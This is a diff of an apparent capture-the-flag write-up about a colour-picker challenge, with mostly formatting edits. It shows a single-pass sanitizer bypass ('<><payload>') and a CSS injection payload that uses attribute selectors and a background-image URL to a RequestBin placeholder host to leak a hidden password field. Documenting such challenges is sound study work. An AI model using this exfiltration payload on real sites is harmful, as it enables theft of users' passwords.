@@ -14,6 +14,7 @@ Wow that's a pretty color! Don't you think? Pick your favourite and show it to t
 	* `hidden input` with `value=<password>`
 	* `visible input` where users can enter a color
 * The entered input colors are sanitized and gets reflected in the `<style>` tag<br/>
+
 ```javascript
 <style> .show {background-image: none; background-color: ${sanitized(input)}}</style>
 
@@ -22,20 +23,23 @@ function sanitized(content) {
         return content;
     }
 ```
+
 * The sanitization is done only once, so it can be bypassed by using the following payload<br/>
+
 ```
 <><malicious-payload>
 ```
+
 * The santization removes `<>` and returns `<malicious-payload>`
 * This is a case of `DOM-based XSS`, but XSS didn't execute on trying various payloads
-* Then trying `CSS Injection` and using a RequestBinURL, it is possible to extract the password from the `hidden input` field
+* Then trying `CSS Injection` and using a RequestBinURL, it is possible to extract the password from the `hidden input` field<br/>
 
-**Payload**
+**Payload**<br/>
 ```
 #000000;} input[type="password"][value^="<value-x>"] {background-image: url('https://<RequestBinURL>/<value-x>');
 ```
 
-**Payload Explanation**
+**Payload Explanation**<br/>
 * `#000000;}` :
 	* Closes the existing style element
 * `input[type="password"][value^="<value-x>"] {background-image: url('https://<RequestBinURL>/<value-x>');` :
